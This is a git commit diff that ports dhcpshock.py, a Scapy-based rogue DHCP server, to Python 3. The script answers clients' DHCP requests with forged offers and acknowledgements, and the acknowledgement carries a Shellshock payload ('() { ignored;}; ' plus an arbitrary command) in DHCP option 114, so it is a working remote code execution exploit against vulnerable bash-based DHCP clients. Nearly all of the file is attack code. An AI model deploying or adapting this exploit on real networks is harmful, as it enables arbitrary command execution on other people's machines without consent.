92db4f1272098c5fd1d4ddbb1dea66bc6251a294
GHPS <GHPS@users.noreply.github.com>
2019-03-27 21:12:54 +0100

    Update to Python 3

--- dhcpshock.py
+++ dhcpshock.py
@@ -25,40 +25,41 @@ if os.geteuid() != 0:
 #BOOTP
 #siaddr = DHCP server ip
 #yiaddr = ip offered to client
-#xid = transaction id 
+#xid = transaction id
 #chaddr = clients mac address in binary format
 
 def dhcp_offer(raw_mac, xid):
-	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-	IP(src="192.168.2.1", dst='255.255.255.255') /
-	UDP(sport=67, dport=68) /
-	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+	packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /\
+	IP(src="192.168.2.1", dst='255.255.255.255') /\
+	UDP(sport=67, dport=68) /\
+	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.2', siaddr='192.168.2.1', xid=xid) /\
 	DHCP(options=[("message-type", "offer"),
 		('server_id', '192.168.2.1'),
 		('subnet_mask', '255.255.255.0'),
-		('router', '192.168.2.5'),
+		('router', '192.168.2.1'),
 		('lease_time', 172800),
 		('renewal_time', 86400),
 		('rebinding_time', 138240),
-		"end"]))
+		"end"])
 
 	return packet
 
 
 def dhcp_ack(raw_mac, xid, command):
-	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-	IP(src="192.168.2.1", dst='255.255.255.255') /
-	UDP(sport=67, dport=68) /
-	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+	payload=str("() { ignored;}; " + command).encode('ASCII')
+	packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff')/ \
+	IP(src="192.168.2.1", dst='255.255.255.255')/\
+	UDP(sport=67, dport=68)/\
+	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.2', siaddr='192.168.2.1', xid=xid) /\
 	DHCP(options=[("message-type", "ack"),
 		('server_id', '192.168.2.1'),
 		('subnet_mask', '255.255.255.0'),
-		('router', '192.168.2.5'),
+		('router', '192.168.2.1'),
 		('lease_time', 172800),
 		('renewal_time', 86400),
 		('rebinding_time', 138240),
-		(114, "() { ignored;}; " + command),
-		"end"]))
+		(114, payload),
+		"end"])
 
 	return packet
 
@@ -70,21 +71,22 @@ def dhcp(resp):
 
 		if resp[DHCP].options[0][1] == 1:
 			xid = resp[BOOTP].xid
-			print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
-			print "[*] Sending OFFER..."
+			print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
+			print("[*] Sending OFFER...")
 			packet = dhcp_offer(raw_mac, xid)
-			#print hexdump(packet)
-			#print packet.show()
+			print(hexdump(packet))
+			packet.show()
 			sendp(packet, iface=args.iface)
 
 		if resp[DHCP].options[0][1] == 3:
 			xid = resp[BOOTP].xid
-			print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
-			print "[*] Sending ACK..."
+			print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))
+			print("[*] Sending ACK...")
 			packet = dhcp_ack(raw_mac, xid, command)
-			#print hexdump(packet)
-			#print packet.show()
+			#print(hexdump(packet))
+			packet.show()
 			sendp(packet, iface=args.iface)
 
-print "[*] Waiting for a DISCOVER..."
+
+print( "[*] Waiting for a DISCOVER...")
 sniff(filter="udp and (port 67 or 68)", prn=dhcp, iface=args.iface)
